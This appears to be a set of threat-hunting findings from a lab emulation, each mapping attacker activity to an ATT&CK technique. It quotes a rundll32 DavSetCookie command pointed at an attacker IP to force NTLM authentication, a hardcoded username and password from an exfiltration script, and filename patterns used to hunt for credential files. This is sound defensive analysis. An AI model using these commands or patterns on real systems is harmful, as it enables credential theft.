title: Credential-access tooling staged via PsExec and hidden PowerShell on compromised hosts
rationale: F02 describes the staging mechanisms surrounding the LSASS access: PsExec64.exe/PSEXESVC.exe executed on nashua.dmevals.local and a hidden PowerShell loader on scranton.dmevals.local, with no standalone credential-dumping binary on disk, indicating in-memory dumping via PowerShell. This is the credential-access staging action, best mapped to T1003 (OS Credential Dumping).

title: LSASS memory access with PROCESS_ALL_ACCESS by hidden PowerShell loader on scranton
rationale: All six findings describe the same attacker action: PowerShell.exe (PID 2976) on scranton.dmevals.local opening lsass.exe (PID 736) with GrantedAccess 0x1f3fff and 0x1fffff (PROCESS_ALL_ACCESS) at 2020-05-02T03:05:16Z, the access mask used to read LSASS memory for credential dumping. F01, F10, F26, F37, F42 and F56 share the same LSASS handle events (AaFHM31uOFchItTka0Gm/AaFHM31uOFchItTka0Gj) and the same host/process context; F37 explicitly notes this is credential dumping rather than authentication-process modification, and F42 notes no Kerberos ticket theft was observed. The best-fitting in-scope technique is T1003.001 (LSASS Memory).

title: PowerShell keylogger (Get-Keystrokes) executed on scranton by user pbeesly
rationale: F09 describes an interactive PowerShell session (PID 3852) on scranton.dmevals.local loading an attacker toolkit from C:\Program Files\SysinternalsSuite\psversion.ps1 and running Get-Keystrokes, i.e. capturing keystrokes. This is keylogging, best mapped to T1056.001.

title: Screen capture and clipboard harvesting in the attacker PowerShell session on scranton
rationale: F11 describes the same scranton session defining Invoke-ScreenCapture (screenshots via System.Windows.Forms/System.Drawing) and running Get-Clipboard to harvest clipboard contents, i.e. GUI input/display capture. Best mapped to T1056.002 (GUI Input Capture).

title: WebDAV forced authentication via rundll32 davclnt.dll DavSetCookie on scranton
rationale: F18 describes PowerShell creating a StartUp shortcut and repeatedly executing 'rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav', the canonical WebDAV forced-authentication primitive that leaks the user's NTLM credentials to an attacker-controlled server. Best mapped to T1187 (Forced Authentication).

title: PyInstaller python.exe staged via PsExec on nashua beacons to 192.168.0.4:8443 and drives the harvesting chain
rationale: F55 describes the PyInstaller python.exe on nashua.dmevals.local launched by PSEXESVC.exe, beaconing to 192.168.0.4:8443 and dropping Rar.exe/sdelete64.exe and spawning the PowerShell session that performed credential-file harvesting. This is the tooling staging the credential theft, best mapped to T1552 (Unsecured Credentials).

title: PowerShell Invoke-Exfil script with embedded plaintext credentials and archive of Downloads
rationale: F23 describes the Invoke-Exfil function on scranton.dmevals.local containing hardcoded plaintext username 'cozy' and password 'MyCozyPassw0rd!' used to map a WebDAV share, plus compression of the Downloads folder. The credential-access element is credentials stored in files/scripts, best mapped to T1552.001 (Credentials In Files).

title: PowerShell on nashua harvests credential-named files across user profile into password-protected archive
rationale: F53 describes a PowerShell script on nashua.dmevals.local recursively enumerating the user profile for credential-related filename patterns (*psw*, *pass*, *login*, *admin*, *vpn, *.pst, *.ost, *.txt, *.lnk, etc.) and compressing them into working.zip. This is searching local files for unsecured credentials, best mapped to T1552.001 (Credentials In Files).

title: Rar.exe on nashua creates password-protected archive of harvested files, then sdelete wipes artifacts
rationale: F54 describes Rar.exe on nashua.dmevals.local creating a password-protected archive of the harvested credential-named files, followed by sdelete64.exe anti-forensic cleanup. The credential-access action is the collection of unsecured credentials into the archive, best mapped to T1552.001 (Credentials In Files).

title: PowerShell Get-PrivateKeys exported all LocalMachine certificates to .pfx files
rationale: F22 and F51 describe the same action on scranton.dmevals.local: the Get-PrivateKeys function (loaded from the masquerading path C:\Program Files\SysinternalsSuite\readme.ps1) enumerating cert:\LocalMachine and calling Export-PfxCertificate to write .pfx files into the user's Downloads folder. This is theft of private keys, best mapped to T1552.004.
